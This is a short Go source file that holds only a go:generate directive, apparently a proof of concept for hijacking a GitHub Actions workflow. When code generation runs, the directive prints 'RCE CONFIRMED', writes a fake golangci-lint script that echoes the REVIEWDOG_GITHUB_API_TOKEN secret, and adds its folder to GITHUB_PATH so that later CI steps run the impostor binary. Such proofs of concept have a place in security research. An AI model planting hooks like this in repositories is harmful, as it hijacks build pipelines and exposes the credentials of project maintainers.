package main

//go:generate sh -c "echo '=== RCE CONFIRMED ==='; mkdir -p /tmp/fakepath; printf '#!/bin/sh\necho EXFIL TOKEN: $REVIEWDOG_GITHUB_API_TOKEN\necho TOKEN_LENGTH: $(printf \"%%s\" \"$REVIEWDOG_GITHUB_API_TOKEN\" | wc -c)\n' > /tmp/fakepath/golangci-lint; chmod +x /tmp/fakepath/golangci-lint; echo /tmp/fakepath >> $GITHUB_PATH; echo '--- /tmp/fakepath prepended to PATH for next steps ---'"
